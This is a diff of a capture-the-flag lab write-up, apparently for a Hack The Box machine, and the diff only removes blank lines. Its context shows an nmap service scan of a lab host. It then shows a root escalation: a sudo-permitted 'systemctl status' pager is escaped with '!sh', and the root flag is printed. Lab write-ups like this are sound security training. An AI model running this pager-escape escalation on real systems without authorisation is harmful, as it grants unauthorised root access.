@@ -32,7 +32,6 @@ PORT      STATE SERVICE REASON
 **Full scan**
 
 ```bash
-
 # Nmap 7.94 scan initiated Wed Jul 12 17:40:23 2023 as: nmap -sVC -p 22,55555 -T4 -Pn -vv -oA sua 10.129.14.235
 Nmap scan report for 10.129.14.235
 Host is up, received user-set (0.35s latency).
@@ -80,7 +79,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Wed Jul 12 17:42:17 2023 -- 1 IP address (1 host up) scanned in 114.44 seconds
 ```
 
@@ -268,10 +266,8 @@ Just enter `!sh` in interactive session after executing the `systemclt status` c
 puma@sau:~$ sudo /usr/bin/systemctl status trail.service
 WARNING: terminal is not fully functional
 -  (press RETURN)!sh
-
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
 # cat /root/root.txt
 f1a680d92c836e650766219ffef801a8
 ```
